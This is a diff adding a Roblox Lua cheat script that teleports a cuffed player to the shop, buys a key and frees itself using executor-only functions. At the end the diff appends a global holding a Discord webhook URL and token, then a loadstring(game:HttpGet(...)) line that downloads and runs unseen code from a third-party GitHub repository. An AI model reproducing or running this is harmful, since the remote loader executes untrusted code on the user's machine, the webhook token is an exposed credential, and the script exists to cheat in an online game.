@@ -1,0 +1,163 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local running = true
+local active = false
+local used = false
+
+local function getShop()
+    local ignored = workspace:FindFirstChild("Ignored")
+    return ignored and ignored:FindFirstChild("Shop")
+end
+
+local function findShopItem(keyword)
+    local shop = getShop()
+    if not shop then return nil end
+
+    for _, item in ipairs(shop:GetChildren()) do
+        if string.find(item.Name:lower(), keyword:lower(), 1, true) then
+            return item
+        end
+    end
+end
+
+local function getItemPart(item)
+    if item:IsA("BasePart") then
+        return item
+    end
+    return item:FindFirstChildWhichIsA("BasePart", true)
+end
+
+local function getKeyShop()
+    local key = findShopItem("[Key]")
+    if not key then return nil end
+
+    local part = getItemPart(key)
+    if not part then return nil end
+
+    return key, part
+end
+
+local function getKeyTool()
+    local char = LocalPlayer.Character
+    local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
+
+    if char then
+        for _, v in ipairs(char:GetChildren()) do
+            if v:IsA("Tool") and string.find(v.Name:lower(), "key", 1, true) then
+                return v
+            end
+        end
+    end
+
+    if backpack then
+        for _, v in ipairs(backpack:GetChildren()) do
+            if v:IsA("Tool") and string.find(v.Name:lower(), "key", 1, true) then
+                return v
+            end
+        end
+    end
+end
+
+local function equipAndUseKey()
+    if used then return end
+
+    local char = LocalPlayer.Character
+    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+    local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
+    if not char or not humanoid or not backpack then return end
+
+    local tool = getKeyTool()
+    if not tool then return end
+
+    used = true
+
+    if tool.Parent == backpack then
+        humanoid:EquipTool(tool)
+        task.wait(0.1)
+    end
+
+    if tool.Parent == char then
+        pcall(function()
+            tool:Activate()
+        end)
+    end
+
+    active = false
+end
+
+local function buyKey()
+    if not active or used then return end
+
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local key, part = getKeyShop()
+    if not key or not part then return end
+
+    hrp.CFrame = part.CFrame * CFrame.new(0, 2, 0)
+
+    local cd = key:FindFirstChildOfClass("ClickDetector")
+        or part:FindFirstChildOfClass("ClickDetector")
+
+    if cd then
+        local fireClick = fireclickdetector or (syn and syn.fire_click_detector)
+
+        if fireClick then
+            pcall(function()
+                fireClick(cd, 0)
+            end)
+        end
+    end
+end
+
+local function monitorCharacter(char)
+    active = false
+    used = false
+
+    local bodyEffects = char:WaitForChild("BodyEffects", 5)
+    if not bodyEffects then return end
+
+    local cuff = bodyEffects:WaitForChild("Cuff", 5)
+    if not cuff then return end
+
+    task.spawn(function()
+        while running and cuff.Parent do
+            if cuff.Value == true then
+                if not active and not used then
+                    active = true
+                end
+
+                if getKeyTool() then
+                    equipAndUseKey()
+                else
+                    buyKey()
+                end
+            else
+                active = false
+            end
+
+            task.wait(0.05)
+        end
+
+        active = false
+    end)
+end
+
+if LocalPlayer.Character then
+    task.spawn(monitorCharacter, LocalPlayer.Character)
+end
+
+LocalPlayer.CharacterAdded:Connect(function(char)
+    task.wait(0.5)
+    if running then
+        task.spawn(monitorCharacter, char)
+    end
+end)
+
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1548164516242788425/gl7BCC5BOTzLG4qL6RGyrT4rAdlj3gV0AjVksSXFJGh63o_eQXVNmv66Z8HfPdizQkJl"
+getgenv().WEBHOOK_COOLDOWN = 5
+getgenv().Gunfarm = false
+getgenv().Whitescreen = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yuvic123/Skidov1.2-stand/refs/heads/main/tung"))()
